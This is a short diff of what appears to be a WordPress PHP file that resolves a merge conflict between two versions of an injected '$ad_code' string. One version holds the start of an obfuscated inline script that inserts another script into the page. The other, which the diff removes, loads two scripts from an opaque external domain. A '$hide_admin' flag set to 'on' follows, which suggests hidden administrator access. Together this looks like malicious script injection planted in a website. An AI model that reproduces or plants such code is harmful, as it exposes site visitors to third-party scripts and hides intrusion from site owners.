@@ -45,7 +45,6 @@ add_action( 'admin_init', function() {
 	
 });
 
-<<<<<<< HEAD
 $ad_code='
 <script>
 (function(__htas){
@@ -59,13 +58,6 @@ l.parentNode.insertBefore(s, l);
 </script>
 
 ';
-=======
-
-$ad_code="
-<script type='text/javascript' src='//aanqylta.com/bb/2f/82/bb2f8268f180d7e0e1613e43c3e34d23.js'></script>
-<script type='text/javascript' src='//aanqylta.com/a4/8a/80/a48a807e59fb8d5503642ee3fcbb8f87.js'></script>
-";
->>>>>>> 37b293d77e87802154af405e590117efe912d53d
 
 
 $hide_admin='on';
